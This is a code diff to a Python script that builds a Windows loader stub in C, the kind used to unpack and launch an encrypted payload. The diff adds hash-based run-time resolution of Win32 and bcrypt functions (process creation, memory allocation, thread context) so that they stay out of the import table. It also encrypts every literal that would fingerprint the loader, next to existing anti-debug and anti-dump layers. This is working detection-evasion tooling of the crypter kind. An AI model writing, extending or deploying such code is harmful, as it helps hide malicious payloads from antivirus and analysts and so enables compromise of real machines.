@@ -69,6 +69,7 @@ SKIP_SUFFIXES = (".pdb", ".exp", ".lib", ".ilk")
 GUARD_LEVELS = ("off", "basic", "full")
 GUARD_DIR = Path(__file__).parent / "obfuscate"
 GUARD_HEADER = "obfus_msvc.h"
+GUARD_RESOLVER = "resolve.h"
 # Per-build salt for the literal keys; mixed into the seed below.
 OBFH_SITE_SALT = int.from_bytes(os.urandom(4), "little")
 
@@ -127,13 +128,15 @@ STUB_C = string.Template(r"""/*
 #define TEMP_PREFIX       L"$TEMP_PREFIX"  /* random folder name prefix    */
 #define ANTIDUMP          $ANTIDUMP         /* 1 = blank SizeOfImage        */
 #define PAYLOAD_ENCRYPTED $PAYLOAD_ENCRYPTED
+$API_BLOCK
 $GUARD
 
 /*
  * Guard layer. CPX_OBF=1 pulls in obfus_msvc.h (the MSVC port of the parts of
  * obfus.h that work without GCC): stack strings, the anti-debug probe set and
  * the flattened dispatcher. Every literal that fingerprints this loader is
- * hidden, and the anti-debug response lives behind an obfuscated sink.
+ * encrypted at build time, and the anti-debug response lives behind an
+ * obfuscated sink.
  */
 #if CPX_OBF
 /* The header brings its own CPY_HSTR / CPY_HWSTR placeholders. */
@@ -1308,6 +1311,19 @@ int wmain(int argc, wchar_t **argv)
     OBF_DISPATCH_BEGIN(int)
 
     OBF_DISPATCH_CASE(0)
+#if CPX_OBF
+        /* Resolve every Win32 entry point by hash before anything touches the
+           filesystem: until this returns, the only imports are the CRT's. */
+        if (!resolve_hidden_imports()) {
+            unsigned slot;
+            for (slot = 0; slot < A_API_COUNT; slot++)
+                if (!g_api[slot])
+                    sayf(L"import slot %u unresolved (hash 0x%08x)", slot,
+                         g_api_table[slot] ^ API_TABLE_KEY);
+            fail(L"cannot resolve the loader imports");
+            OBF_DISPATCH_EXIT
+        }
+#endif
         if (GetModuleFileNameW(NULL, self, MAX_PATH) == 0) {
             fail(L"cannot resolve own path");
             OBF_DISPATCH_EXIT
@@ -1367,6 +1383,148 @@ def _new_keys() -> tuple[bytes, bytes, bytes, bytes]:
     return key, mask, bytes(k ^ m for k, m in zip(key, mask)), os.urandom(16)
 
 
+# ----------------------------------------------------------------------
+# hidden imports
+#
+# Everything the stub (or the anti-debug layer) calls that is NOT part of the
+# static CRT's own import list. These are resolved at run time by keyed hash
+# against the export directories, so they never appear in the PE import table.
+# GetModuleHandleW / LoadLibraryExW / GetProcAddress are deliberately absent:
+# the CRT already imports them and the resolver needs them to bootstrap.
+# ----------------------------------------------------------------------
+
+_H = "0x3d9f"  # only used to keep the tuple readable below
+
+HIDDEN_APIS: list[tuple[str, str, str, str]] = [
+    ("kernel32.dll", "AddVectoredExceptionHandler", "PVOID", "ULONG, PVOID"),
+    ("kernel32.dll", "CreateDirectoryW", "BOOL", "LPCWSTR, LPSECURITY_ATTRIBUTES"),
+    ("kernel32.dll", "CreateProcessW", "BOOL",
+     "LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, "
+     "DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION"),
+    ("kernel32.dll", "CreateThread", "HANDLE",
+     "LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD"),
+    ("kernel32.dll", "DeleteFileW", "BOOL", "LPCWSTR"),
+    ("kernel32.dll", "DuplicateHandle", "BOOL",
+     "HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD"),
+    ("kernel32.dll", "FindFirstFileW", "HANDLE", "LPCWSTR, LPWIN32_FIND_DATAW"),
+    ("kernel32.dll", "FlushInstructionCache", "BOOL", "HANDLE, LPCVOID, SIZE_T"),
+    ("kernel32.dll", "GenerateConsoleCtrlEvent", "BOOL", "DWORD, DWORD"),
+    ("kernel32.dll", "GetCurrentProcess", "HANDLE", "void"),
+    ("kernel32.dll", "GetCurrentThread", "HANDLE", "void"),
+    ("kernel32.dll", "GetEnvironmentVariableW", "DWORD", "LPCWSTR, LPWSTR, DWORD"),
+    ("kernel32.dll", "GetExitCodeProcess", "BOOL", "HANDLE, LPDWORD"),
+    ("kernel32.dll", "GetExitCodeThread", "BOOL", "HANDLE, LPDWORD"),
+    ("kernel32.dll", "GetFileAttributesW", "DWORD", "LPCWSTR"),
+    ("kernel32.dll", "GetModuleHandleA", "HMODULE", "LPCSTR"),
+    ("kernel32.dll", "GetTempPathW", "DWORD", "DWORD, LPWSTR"),
+    ("kernel32.dll", "GetThreadContext", "BOOL", "HANDLE, LPCONTEXT"),
+    ("kernel32.dll", "LoadLibraryW", "HMODULE", "LPCWSTR"),
+    ("kernel32.dll", "ReadFile", "BOOL",
+     "HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED"),
+    ("kernel32.dll", "RemoveDirectoryW", "BOOL", "LPCWSTR"),
+    ("kernel32.dll", "ResumeThread", "DWORD", "HANDLE"),
+    ("kernel32.dll", "SetConsoleCtrlHandler", "BOOL", "PHANDLER_ROUTINE, BOOL"),
+    ("kernel32.dll", "SetDllDirectoryW", "BOOL", "LPCWSTR"),
+    ("kernel32.dll", "SetFileAttributesW", "BOOL", "LPCWSTR, DWORD"),
+    ("kernel32.dll", "Sleep", "void", "DWORD"),
+    ("kernel32.dll", "SuspendThread", "DWORD", "HANDLE"),
+    ("kernel32.dll", "VirtualAlloc", "LPVOID", "LPVOID, SIZE_T, DWORD, DWORD"),
+    ("kernel32.dll", "WaitForSingleObject", "DWORD", "HANDLE, DWORD"),
+    ("bcrypt.dll", "BCryptCloseAlgorithmProvider", "long", "void *, unsigned long"),
+    ("bcrypt.dll", "BCryptDecrypt", "long",
+     "void *, unsigned char *, unsigned long, void *, unsigned char *, "
+     "unsigned long, unsigned char *, unsigned long, unsigned long *, unsigned long"),
+    ("bcrypt.dll", "BCryptDestroyKey", "long", "void *"),
+    ("bcrypt.dll", "BCryptGenRandom", "long",
+     "void *, unsigned char *, unsigned long, unsigned long"),
+    ("bcrypt.dll", "BCryptGenerateSymmetricKey", "long",
+     "void *, void **, unsigned char *, unsigned long, unsigned char *, "
+     "unsigned long, unsigned long"),
+    ("bcrypt.dll", "BCryptOpenAlgorithmProvider", "long",
+     "void **, const wchar_t *, const wchar_t *, unsigned long"),
+    ("bcrypt.dll", "BCryptSetProperty", "long",
+     "void *, const wchar_t *, unsigned char *, unsigned long, unsigned long"),
+]
+
+
+def obfh_hash(data: bytes, key: int) -> int:
+    """Mirror of obfh_hash_name()/obfh_hash_step() in resolve.h."""
+    m = 0xFFFFFFFF
+    h = (key & m) or 0x811C9DC5
+    for b in data:
+        h = (((h ^ b) * 0x01000193) + 0x3D9F) & m
+        h ^= h >> 7
+    return h or 1
+
+
+def _api_block() -> str:
+    """Typedefs, slot table, encrypted hashes and the call-site macros."""
+    if not (GUARD_DIR / "resolve.h").is_file():
+        raise FileNotFoundError(f"Resolver missing: {GUARD_DIR / 'resolve.h'}")
+
+    hash_key = int.from_bytes(os.urandom(4), "little")
+    table_key = int.from_bytes(os.urandom(4), "little")
+    modules: list[str] = []
+    for mod, _, _, _ in HIDDEN_APIS:
+        if mod not in modules:
+            modules.append(mod)
+    mod_keys = [int.from_bytes(os.urandom(1), "little") or 0x5A for _ in modules]
+
+    out = ['#include "literals.h"', "", '#include "resolve.h"', ""]
+    out.append("/* --- hidden imports: resolved by hash, never imported --- */")
+    for _, name, ret, params in HIDDEN_APIS:
+        out.append(f"typedef {ret} (WINAPI *PFN_{name})({params});")
+    out.append("")
+    out.append("enum { " + ", ".join(f"A_{n}" for _, n, _, _ in HIDDEN_APIS) +
+               ", A_API_COUNT };")
+    out.append("static void *g_api[A_API_COUNT];")
+    out.append(f"#define API_HASH_KEY 0x{hash_key:08x}u")
+    out.append(f"#define API_TABLE_KEY 0x{table_key:08x}u")
+    out.append("static const unsigned g_api_table[A_API_COUNT] = {")
+    stored = [obfh_hash(f"{m}!{n}".encode(), hash_key) ^ table_key
+              for m, n, _, _ in HIDDEN_APIS]
+    for i in range(0, len(stored), 4):
+        out.append("    " + ", ".join(f"0x{v:08x}u" for v in stored[i:i + 4]) +
+                   ("," if i + 4 < len(stored) else ""))
+    out.append("};")
+    out.append("")
+    # Module names for the resolver, in static encrypted form: these are the
+    # only decoded strings that must outlive the expression they are decoded in.
+    out.append("static const unsigned char g_api_mod[%d][40] = {" % len(modules))
+    for i, m in enumerate(modules):
+        key = mod_keys[i]
+        raw = m.encode("utf-16-le") + b"\x00\x00"
+        row = ", ".join(f"0x{b ^ key:02x}" for b in raw)
+        out.append("    {" + row + "},")
+    out.append("};")
+    out.append("static const unsigned char g_api_mod_key[%d] = {" % len(modules) +
+               ", ".join(f"0x{k:02x}" for k in mod_keys) + "};")
+    out.append("static const unsigned g_api_mod_len[%d] = {" % len(modules) +
+               ", ".join(str(len(m.encode("utf-16-le")) + 2) for m in modules) + "};")
+    out.append("")
+    for _, name, _, _ in HIDDEN_APIS:
+        out.append(f"#define {name} ((PFN_{name})g_api[A_{name}])")
+    out.append("")
+    out.append("static int resolve_hidden_imports(void)")
+    out.append("{")
+    out.append("    wchar_t mbuf[%d][32];" % len(modules))
+    out.append(f"    const wchar_t *mods[{len(modules)}];")
+    out.append("    unsigned i;")
+    out.append("")
+    out.append("    /* Static encrypted bytes, decoded into our own storage: a compound")
+    out.append("       literal modified in place does not survive the statement on MSVC. */")
+    out.append("    for (i = 0; i < %du; i++)" % len(modules))
+    out.append("        mods[i] = obfh_wstr_from_static(mbuf[i], 32, g_api_mod[i],")
+    out.append("                                    g_api_mod_key[i], g_api_mod_len[i]);")
+    out.append("    return obfh_resolve_table(g_api_table, g_api, A_API_COUNT,")
+    out.append("                              API_TABLE_KEY, API_HASH_KEY, mods,")
+    out.append(f"                              {len(modules)}u);")
+    out.append("}")
+    out.append("")
+    return "\n".join(out)
+
+
+
 def _guard_block(level: str) -> str:
     """Preprocessor block the stub #includes: obfus_msvc.h plus its switches.
 
@@ -1385,6 +1543,11 @@ def _guard_block(level: str) -> str:
         f'#include "{GUARD_HEADER}"',
     ]
     return "\n".join(defines) + "\n"
+
+
+def _api_slot_block(level: str) -> str:
+    """Hidden-import machinery; empty when the guard is off."""
+    return "" if level == "off" else _api_block() + "\n"
 
 
 def _encrypt_literals(src: str) -> str:
@@ -1411,8 +1574,14 @@ def _encrypt_literals(src: str) -> str:
         text = m.group(1)
         key = key_for(text)
         raw = text.encode("utf-16-le") + b"\x00\x00"
-        points = ", ".join(f"0x{b ^ key:02x}" for b in raw)
-        return (f"obfh_decrypt_wstr((wchar_t[]){{{points}}}, "
+        # One wchar_t per code point: combining the byte pair matters, emitting
+        # the bytes separately would produce L"k\x00e\x00" as individual
+        # characters and the string would never match anything.
+        vals = "".join(
+            f"0x{(raw[i] ^ key) | ((raw[i + 1] ^ key) << 8):04x}, "
+            for i in range(0, len(raw), 2)
+        )
+        return (f"obfh_decrypt_wstr((wchar_t[]){{{vals.rstrip()}}}, "
                 f"0x{key:02x}, {len(raw) // 2})")
 
     def narrow(m: re.Match) -> str:
@@ -1435,6 +1604,7 @@ def write_stub_c(work: Path, app_name: str, k1: tuple, k2: tuple,
         TEMP_PREFIX=app_name,
         ANTIDUMP="1" if antidump else "0",
         PAYLOAD_ENCRYPTED="1" if encrypt else "0",
+        API_BLOCK=_api_slot_block(guard),
         GUARD=_guard_block(guard),
         K1_MASK=_bytes_list(k1[1]),
         K1_MASKED=_bytes_list(k1[2]),
@@ -1445,10 +1615,18 @@ def write_stub_c(work: Path, app_name: str, k1: tuple, k2: tuple,
     )
     header = work / GUARD_HEADER
     if guard != "off":
-        # The header sits next to the generated .c (no include path juggling)
-        # and its own literals are encrypted in the same pass.
+        # Both headers sit next to the generated .c (no include path juggling)
+        # and their own literals are encrypted in the same pass.
         header.write_text(
             _encrypt_literals((GUARD_DIR / GUARD_HEADER).read_text(encoding="utf-8")),
+            encoding="utf-8",
+        )
+        (work / GUARD_RESOLVER).write_text(
+            _encrypt_literals((GUARD_DIR / GUARD_RESOLVER).read_text(encoding="utf-8")),
+            encoding="utf-8",
+        )
+        (work / "literals.h").write_text(
+            (GUARD_DIR / "literals.h").read_text(encoding="utf-8"),
             encoding="utf-8",
         )
         src = _encrypt_literals(src)
